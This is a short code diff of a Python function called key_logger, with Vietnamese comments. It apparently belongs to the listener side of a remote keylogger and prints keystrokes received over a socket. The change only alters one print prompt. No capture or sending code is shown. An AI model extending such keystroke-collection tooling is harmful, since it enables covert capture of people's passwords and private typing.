@@ -40,7 +40,7 @@ def key_logger(client_socket):
                 if decoded_data == ' Key.enter ':
                     print(f'\rPhim nhan: {keys_pressed}')  # In ra các phím đã nhấn
                     keys_pressed = ""  # Reset sau khi nhấn Enter
-                    print("Phim nhan: ", end='')  # Đưa con trỏ về đầu dòng để tiếp tục nhập
+                    print("", end='')  # Đưa con trỏ về đầu dòng để tiếp tục nhập
                     
                 elif decoded_data == "KEYLOGGER_STOPPED":
                     print("\nDa dung Keylogger.")
